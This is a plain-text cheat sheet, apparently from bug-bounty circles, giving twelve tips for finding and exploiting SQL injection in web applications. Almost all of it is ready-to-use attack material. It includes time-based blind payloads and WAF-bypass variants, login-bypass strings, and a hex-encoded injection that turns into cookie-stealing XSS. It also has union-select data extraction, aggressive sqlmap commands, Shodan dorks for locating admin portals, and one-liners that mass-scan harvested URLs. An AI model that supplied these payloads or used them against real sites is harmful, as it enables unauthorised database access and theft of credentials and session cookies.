
							Finding SQLi TIPS
							------------------------

 #Tip1:-
 ==========
        - Fuzzing on subdomain.com on this wordlist [https://t.co/btRdm0tpcn]
	- But get all result 403
	- Search on shodan IPs
	- You can find the same service on
		subset.com
	- Fuzzing Again
	- subtest.domain/wp-content/mysql.sql


 #Tip 2:
 ========
	Finding SQLi using jeeves
	$ echo "example.com" | gf sqli | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 10
	[https://t.co/nZqYEhLgIE]
         
	 sqlmap -u “url” -p parameter --level 5 --risk 3 --dbms="MySQL" --random-agent --test-filter="boolean-based blind"  --    current-user --hostname 

 #Tip 3:
 =======
**Try Error Base SQL injection **

	This is how to find sql-Injection of the time
	/?q=1
	/?q=1'
	/?q=1"
	/?q=[1]
	/?q[]=1
	/?q=1`
	/?q=1\
	/?q=1/*'*/
	/?q=1/*!1111'*/
	/?q=1'||'asd'||'   <== concat string
	/?q=1' or '1'='1
	/?q=1 or 1=1
	/?q='or''='
	/?q=")
	/?q=')
	/?q=-x()

**Try This Payload in Wp-login.php page**
	
	0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 20.002
	0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.282
	0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 0.912
	0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 16.553
	0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.463
	0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z => 1.229
	0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 7.79

 #Tip 4:
=========
	How to find SQLi using Shodan
	1. Shodan dork: SSL:""
	2. Found employee's admin portal and username input vulnerable to sqli.
	3. Sqlmap command:
	$ sqlmap  -r req.txt --batch --force-ssl --level 5 --risk 3 --dbs --hostname --current-user -p "username"
	$- sqlmap -u http://example.com --batch --banner --tamper=space2comment --user-agent=random

 #Tip 5:
=========
	SQL injection vulnerable to XSS:
	
 	Payload:
 	concat(0x3c7363726970743e70726f6d70742822,0x3078336e30,0x7c7c,user(),0x7c7c,database(),
        0x222c646f63756d656e742e636f6f6b6965293c2f7363726970743e)


 #Tip 6:
 =========
	SQLi payload in .html site and reflected in the title.
	example site: [example.com/index.html]
	website/example'+union+select+CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION())+--+.html


 #Tip 7:
 ============
        You can inject header too with SQLi POC:
 	$ sqlmap -u "https://example.com" --header="X-Forwarded-For: 1*" --dbs --batch --random-agent --threads=10



 #Tip 8:
==========
 	- Uncover the Blind SQL injection with 'XOR' operator
 	/path/to/vuln?param=not_exist'XOR(if(now()=sysdate(),sleep(5),0))XOR'

	- Hanging with WAF
 	/path/to/vuln?param=not_exist%27XoR(if(nOw()=SySDaTe(),/**/SlEep(5),/**/0))XoR%27/*


	_Akami WAF Bypass & SQLi
	  'XOR(if(now()=sysdate(),sleep(5*5),0))OR'


 #Tip 9:
================
 
 	SQL injection:
 	In username,email parameter
	login, sigup, forget 
  
	Add this Sleep Payload 
	abdul'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),10)||'


 #Tip 10:
==============
	~Admin Panel Access via sqli:
 	
 	1- Search for login page through with dork:
 	   org:"Target.com" http.title:"Login"
	2- Bypass login with old way
 	   admin' or 1=1

	++++++++++++++++++++++++++++++++++++++++++++++
 
	Useful onliner command to find sql using httpx:
	$ cat host.txt | httpx -c -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80,443,8080,8443 | anew myP1s.txt


Tips 11:
=================

	SQLi-TimeBased scanner

	gau DOMAIN.tld  | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done

===================

Tips: 12:
========
	Oneliner Sqli:
	--------------
	findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1













